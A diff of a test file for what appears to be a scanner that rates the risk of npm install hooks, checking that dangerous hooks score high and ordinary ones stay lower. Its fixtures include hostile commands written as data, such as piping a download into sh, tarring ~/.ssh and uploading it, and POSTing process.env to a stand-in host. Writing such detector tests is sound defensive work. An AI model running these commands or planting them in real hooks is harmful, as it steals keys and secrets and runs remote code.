@@ -62,7 +62,7 @@ def test_wfx_text_in_the_script_is_critical(tmp_path):
     ("sh .setup-env.sh", {".setup-env.sh": "echo hi\n"}, "hidden file"),
     ("node scripts/a.js >/dev/null 2>&1", {"scripts/a.js": "console.log(1)\n"}, "throws away"),
     ("curl -s https://example.invalid/i | sh", {}, "downloaded or decoded"),
-    ("node -e \"require('child_process').exec('id')\"", {}, "downloaded or decoded"),
+    ("node -e \"require('https').get('https://example.invalid/p')\"", {}, "downloaded or decoded"),
     ("bash scripts/s.sh", {"scripts/s.sh": "tar c ~/.ssh | curl -s -T - https://example.invalid/u\n"}, "uploads"),
     ("node scripts/p.js", {"scripts/p.js": "const d = JSON.stringify(process.env);\n"
                                            "require('https').request({host: 'example.invalid', method: 'POST'})"
@@ -83,6 +83,8 @@ def test_risky_hooks_are_high(tmp_path, cmd, files, why):
                                              "require('https').get('https://example.invalid/bin', r => cp.execSync('tar x'));\n"},
      Severity.MEDIUM),                                                              # binary downloader, own repo
     ("npm install https://github.com/o/r.git", {}, Severity.MEDIUM),                # downloads only
+    ("node -e \"console.error('use pnpm (PowerShell: . ./activate.ps1)');process.exit(1)\"", {}, Severity.LOW),
+    ("node -e \"require('child_process').spawnSync('lefthook', ['install'])\"", {}, Severity.MEDIUM),  # Hermes
     ("node scripts/f.js", {"scripts/f.js": "module.exports = function (a) { return a }\n"}, Severity.MEDIUM),
 ])
 def test_ordinary_hooks_stay_below_high_in_daily_mode(tmp_path, cmd, files, expect):
